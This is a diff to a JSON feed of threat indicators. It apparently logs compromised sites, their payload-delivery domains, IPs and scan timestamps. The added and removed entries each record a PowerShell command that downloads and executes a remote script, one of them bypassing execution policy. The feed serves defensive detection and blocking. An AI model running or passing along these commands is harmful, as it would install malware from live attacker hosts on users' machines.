@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "chatatrebichava.sk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b0de676f73f38451"
+    ],
+    "IP": [
+      "37.9.175.195"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b0de676f73f38451')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b0de676f73f38451"
+    ],
+    "ReportId": "cmwmotlf31trr0omlxtldvn56",
+    "ScannedAt": "2026-11-18T22:23:12.108000+00:00"
+  },
+  {
     "UrlDomain": "gruendlers.com.tr",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -4022,25 +4041,5 @@
     ],
     "ReportId": "cmwlelo8a1i9h0omltrse0fps",
     "ScannedAt": "2026-11-18T00:49:20.146000+00:00"
-  },
-  {
-    "UrlDomain": "www.lapetitebarque.fr",
-    "DeliveryUrl": [
-      "sentrydb.org",
-      "pillingthat.com"
-    ],
-    "PayloadUrl": [
-      "https://pillingthat.com/WfodrrIBwI"
-    ],
-    "IP": [
-      "87.98.154.146"
-    ],
-    "Related": [],
-    "Payload": "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f 'https://pillingthat[.]com/WfodrrIBwI';powershell -ep bypass -File $f\"",
-    "ResolvedDownloadUrl": [
-      "https://pillingthat.com/WfodrrIBwI"
-    ],
-    "ReportId": "cmwl9b54l1i4f0omls40cjhgn",
-    "ScannedAt": "2026-11-17T22:21:10.789000+00:00"
   }
 ]
